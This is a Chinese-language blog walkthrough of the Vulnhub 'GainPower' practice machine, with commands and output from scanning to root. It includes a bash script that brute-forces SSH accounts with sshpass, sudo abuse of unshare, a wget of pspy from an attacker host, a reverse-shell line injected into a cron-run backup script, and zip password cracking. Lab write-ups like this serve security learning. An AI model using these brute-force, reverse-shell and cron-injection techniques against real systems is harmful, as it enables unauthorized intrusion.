---
layout: post
toc: true
title: "「vulnhub」：GainPower靶场渗透历程"
wrench: 2020-12-08
author: Bin4xin
categories:
    - blog
    - Vulnhub
    - 笔记
    - 渗透
permalink: /blog/GainPower/walkthrough/
---

> Vulnhub靶机练习，记录从信息收集到获取root权限的完整过程。靶机涉及SSH爆破、sudo提权、crontab利用、zip密码破解等多个知识点。

## 靶机信息

- **靶机名称**：GainPower
- **难度**：中等
- **目标**：获取root权限
- **攻击机**：Kali Linux

## 信息收集

### nmap扫描

```bash
nmap -sC -sV -O <target_ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## 第一步：employee1 - SSH Banner信息泄露

通过nmap扫描SSH服务时，注意到SSH banner信息中包含提示：

```bash
ssh <target_ip>
# Banner中发现提示信息，暗示employee1的密码
```

根据banner提示获得低权限shell：

```bash
ssh employee1@<target_ip>
# 输入根据提示猜解的密码，成功登录
$ id
uid=1001(employee1) gid=1001(employee1) groups=1001(employee1)
```

## 第二步：employee64 - 脚本批量SSH爆破

登录后发现系统中存在多个employee用户（employee1 ~ employee100），需要找到拥有sudo权限的用户。

编写bash脚本批量爆破：

```bash
#!/bin/bash

pwn () {
  read -p 'target ip: ' ip
  sleep 2
  for data in {1..100}
  do
      echo 'Try: ' $data
      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
      printf "\n"
  done
}

pwn
```

脚本逻辑：遍历`employee1` ~ `employee100`，使用`sshpass`批量SSH连接，密码与用户名一致（`employee+数字`），然后尝试`sudo -l`查看权限。

执行结果：

```bash
# 大部分用户无sudo权限
[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。

# employee64存在sudo权限！
[sudo] employee64 的密码：
用户 employee64 可以在 localhost 上运行以下命令：
    (programmer) /usr/bin/unshare
```

## 第三步：programmer - sudo提权到programmer

`employee64`可以以`programmer`身份执行`/usr/bin/unshare`：

```bash
$ su - employee64
Password: employee64

$ sudo -u programmer /usr/bin/unshare
# unshare命令可以创建新的命名空间，配合/bin/bash获得programmer的shell

$ sudo -u programmer unshare /bin/bash
$ id
uid=1002(programmer) gid=1002(programmer) groups=1002(programmer)
```

## 第四步：vanshal - crontab计划任务提权

切换到programmer用户后，使用pspy工具检测后台定时任务：

```bash
# 上传pspy到靶机
$ wget http://<attacker_ip>/pspy64
$ chmod +x pspy64
$ ./pspy64
```

pspy检测到定时执行的脚本：

```
CMD: UID=1003  PID=xxxx  | /bin/sh /media/programmer/scripts/backup.sh
```

查看backup.sh内容：

```bash
$ cat /media/programmer/scripts/backup.sh
#!/bin/bash
# 执行备份操作，以vanshal用户身份运行
```

由于programmer用户对该脚本有写入权限，可以注入反弹shell：

```bash
$ echo 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' >> /media/programmer/scripts/backup.sh
```

监听等待crontab触发：

```bash
# 攻击机监听
$ nc -lvnp 4444
Connection from <target_ip> received!
$ id
uid=1003(vanshal) gid=1003(vanshal) groups=1003(vanshal)
```

## 第五步：root - ZIP密码破解

在vanshal用户目录下发现一个加密的zip文件：

```bash
$ find / -name "*.zip" 2>/dev/null
/home/vanshal/secret.zip

# 使用fcrackzip或john破解zip密码
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip
PASSWORD FOUND!!!!: pw == <cracked_password>

# 解压zip文件
$ unzip -P <cracked_password> secret.zip
```

zip文件中包含root的密码或提权线索。登录Ajenti管理面板（或直接su root）：

```bash
$ su root
Password: <cracked_password>
$ id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/root.txt
Congratulations! You've pwned the GainPower box!
```

## 提权路径总结

```
employee1 (SSH banner泄露)
    │
    ▼
employee64 (脚本批量爆破 + sudo unshare)
    │
    ▼
programmer (sudo -u programmer unshare /bin/bash)
    │
    ▼
vanshal (crontab backup.sh写入反弹shell)
    │
    ▼
root (zip密码破解)
```

## 知识点

1. **SSH Banner信息泄露**：配置不当的SSH服务可能在banner中泄露敏感信息
2. **批量爆破**：针对弱口令用户使用脚本批量尝试
3. **sudo提权**：利用`sudo -l`发现可执行的命令，通过`unshare`切换用户
4. **crontab利用**：使用pspy监控定时任务，对可写脚本注入命令
5. **ZIP密码破解**：fcrackzip/john工具暴力破解加密压缩包

## 参考

- [Vulnhub - GainPower](https://www.vulnhub.com/entry/gainpower-1,418/){:target="_blank"}
- [pspy - Linux进程监控](https://github.com/DominicBreuker/pspy){:target="_blank"}

以上。